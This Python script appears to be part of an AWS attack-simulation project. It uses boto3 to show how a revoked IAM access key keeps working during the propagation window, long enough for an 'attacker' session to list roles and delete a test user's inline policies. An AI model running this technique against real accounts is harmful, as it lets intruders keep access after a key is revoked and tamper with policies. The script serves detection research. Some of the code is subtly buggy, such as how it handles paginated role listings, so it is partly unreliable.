"""
This simulation focuses on eventual consistency in AWS environment that allows
any access-key to work within a short span of time.

NOTE: as per the fix implemented by AWS, it is not possible to use set of deleted AWS access keys to create a new one.
however, an attacker can list policies and remove them within the propagation window. 
"""

import boto3
import time
from botocore.exceptions import ClientError
from logger import get_logger

logger = get_logger("eventual_consistency")

def persistence_via_eventual_consistency() -> None:

    # hardcoding user information, soon to be replaced by pulumi stack output
    user_creds={
        "user_name": "mayatrail-test"
    }

    def delete_access_key(iam_client) -> bool:
        """perform the iam delete-access-key operation on given id"""

        try:
            nonlocal user_creds
            if user_creds.get("user_access_key_id"):
                # perform the deletion
                _ = iam_client.delete_access_key(
                    UserName=user_creds.get("user_name"),
                    AccessKeyId=user_creds.get("user_access_key_id")
                )
                logger.info("User's access key deleted successfully")
                return True
            else:
                logger.error("User credentials not provided")
                return False
        except (
            Exception, 
            iam_client.exceptions.LimitExceededException, 
            iam_client.exceptions.NoSuchEntityException,
            iam_client.exceptions.NoSuchEntityException) as err:
            logger.error(f"Unable to create new access key: {err.__str__()}")
            return False

    def create_access_key(iam_client) -> bool:
        """perform the iam create-access-key operation only after
        delete_access_key has been performed"""

        try:
            nonlocal user_creds
            iam_cak_resp = iam_client.create_access_key(UserName=user_creds.get("user_name"))
            if iam_cak_resp.get("AccessKey"):
                user_creds.update({"user_access_key_id": iam_cak_resp.get("AccessKey").get("AccessKeyId")})
                user_creds.update({"user_access_key_secret": iam_cak_resp.get("AccessKey").get("SecretAccessKey")})
                logger.info("User's access key and secret created successfully")
                return True
            else:
                logger.error("Unable to retrieve user access key details!")
                return False
        except (
            Exception, 
            iam_client.exceptions.LimitExceededException, 
            iam_client.exceptions.NoSuchEntityException,
            iam_client.exceptions.NoSuchEntityException) as err:
            logger.error(f"Unable to create new access key: {err.__str__()}")
            return False

    def get_cloudtrail_logs():
        """get cloudtrail logs to determine what calls have been logged
        after delete-access-key operation"""
        pass

    def create_session(profile_name:str=None):
        """this session will server leaked credentials to multiple boto3 clients"""

        nonlocal user_creds
        try:
            if profile_name:
                session = boto3.session.Session(profile_name=profile_name)
            else:
                if not (user_creds.get("user_access_key_id") and user_creds.get("user_access_key_secret")):
                    logger.error("User's AccessKeyID and Secret not provided")
                    return False
                else:
                    session = boto3.session.Session(
                        aws_access_key_id=user_creds.get("user_access_key_id"),
                        aws_secret_access_key=user_creds.get("user_access_key_secret"),
                        region_name="ap-south-1"
                    )
                    logger.info("session has been configured successfully")
            return session        
        except Exception as err:
            logger.error(f"Unable to create boto3 session: {err.__str__()}")
            return False

    # main
    # user session set-up
    user_session = create_session(profile_name="mayatrail-user")
    user_iam_client = user_session.client("iam")
    # this operation leaks credentials to other methods
    create_access_key(user_iam_client)

    # attacker - creating a session with leaked credentials
    attacker_session = create_session()
    attacker_iam_client = attacker_session.client("iam")
    
    max_retries = 30
    retry_delay = 5  # seconds
    for attempt in range(max_retries):
        try:
            iam_roles_list = attacker_iam_client.get_paginator("list_roles").paginate()
            for each_role in iam_roles_list:
                logger.info(f"RoleName: {each_role.get('RoleName')}")
            break  # Success, exit retry loop
        except ClientError as e:
            if e.response['Error']['Code'] == 'InvalidClientTokenId' and attempt < max_retries - 1:
                logger.warning(f"Credentials not yet propagated, retrying in {retry_delay}s... (attempt {attempt + 1}/{max_retries})")
                time.sleep(retry_delay)
            else:
                raise
    
    # user - delete the access key, as it has been leaked
    delete_access_key(user_iam_client)
    
    # attacker - exploit eventual consistency window to list and delete compromised user policies
    # before deletion propagates across AWS
    logger.info("Attacker attempting to exploit eventual consistency window...")
    attacker_succeeded = False
    for attempt in range(max_retries):
        try:
            # attacker made some API calls to test eventual consistency
            iam_lup_resp = attacker_iam_client.list_user_policies(UserName=user_creds.get("user_name"))
            if iam_lup_resp.get("PolicyNames"):
                policy_name = iam_lup_resp.get("PolicyNames")[0]
                attacker_iam_client.delete_user_policy(UserName=user_creds.get("user_name"), PolicyName=policy_name)
                attacker_succeeded = True
                logger.info("Attacker has successfully deleted the policy before propagation completes")
            else:
                logger.info("Policy does not exist")
        except ClientError as e:
            if e.response['Error']['Code'] == 'InvalidClientTokenId':
                if attempt < max_retries - 1:
                    logger.info(f"Credentials invalid, retrying in {retry_delay}s... (attempt {attempt + 1}/{max_retries})")
                    time.sleep(retry_delay)
                else:
                    logger.info("Deletion fully propagated - attacker can no longer use deleted credentials")
            else:
                logger.error(f"Unexpected error: {e}")
                break
    
    if not attacker_succeeded:
        logger.info("Eventual consistency window closed - attack failed")
    else:
        logger.info("Policy deleted within eventual consistency window attack passed")